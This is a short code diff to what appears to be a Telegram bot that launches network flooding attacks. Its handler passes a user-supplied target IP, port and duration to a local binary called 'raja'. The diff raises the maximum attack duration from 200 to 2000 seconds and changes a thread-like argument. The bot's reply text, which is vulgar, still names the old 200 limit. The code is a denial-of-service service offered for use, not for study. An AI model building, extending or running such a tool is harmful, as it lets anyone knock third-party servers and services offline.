@@ -111,7 +111,7 @@ async def attack(update: Update, context: CallbackContext):
     # Validate duration
     try:
         duration = int(duration)
-        if duration > 200:  # New duration limit
+        if duration > 2000:  # New duration limit
             response = "*ruk madharcod 🥵200 200 krke do lgale lode.*" 
             await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown') 
             return
@@ -166,7 +166,7 @@ async def rajaraj_04(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./raja {ip} {port} {duration} 900",
+            f"./raja {ip} {port} {duration} 50",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
